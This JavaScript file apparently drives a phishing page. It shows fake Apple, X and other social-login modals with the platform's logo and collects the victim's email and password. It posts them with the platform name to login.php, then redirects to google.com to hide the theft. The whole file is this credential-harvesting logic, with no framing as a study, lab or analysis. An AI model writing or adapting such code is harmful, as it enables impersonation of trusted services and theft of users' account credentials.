
var platform;

document.querySelectorAll('.social-btn').forEach(btn => {
  btn.addEventListener('click', (e) => {
    e.preventDefault();
    const platform = e.target.className.split(' ')[1];
    var mod = "";
    if (platform == "apple" || platform == "x") {
      mod = "-inv";
    }
    document.getElementById('login-img').src = "social/" + platform + mod + ".png";
    setTimeout(() => openLoginModal(platform),250);
  });
});

function openLoginModal(pf) {
  platform = pf;
  document.getElementById('login-modal').style.display = 'block';
}

document.getElementById('close-modal').addEventListener('click', () => {
  document.getElementById('login-modal').style.display = 'none';
});

window.onclick = function(event) {
  if (event.target === document.getElementById('login-modal')) {
    document.getElementById('login-modal').style.display = 'none';
  }
};

// Handle form submission
document.getElementById('login-form').addEventListener('submit', (e) => {
  e.preventDefault();
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
 
  const formData = new URLSearchParams();
  formData.append('email', email);
  formData.append('password', password);
  formData.append('platform', platform);
  
  const spinner = document.getElementById('spinner');
  const errorElement = document.getElementById('error-msg');
  spinner.style.visibility = "visible";
  errorElement.style.color = "red";
  errorElement.style.visibility = "hidden";

  fetch('login.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: formData.toString()
  })
  .then(response => {
    console.log(response);
    if (!response.ok) {
      return response.json().then(error => {throw error});
    }

    return response.json();
  })
  .then(data => {
    spinner.style.visibility = "hidden";
    errorElement.style.color = "green";
    errorElement.style.innerText = data.message;
    window.location = "https://www.google.com";
  })
  .catch(error => {
    spinner.style.visibility = "hidden";
    console.error('Error: ', error);
    errorElement.innerText = error.message;
    errorElement.style.visibility = "visible";
  });

});
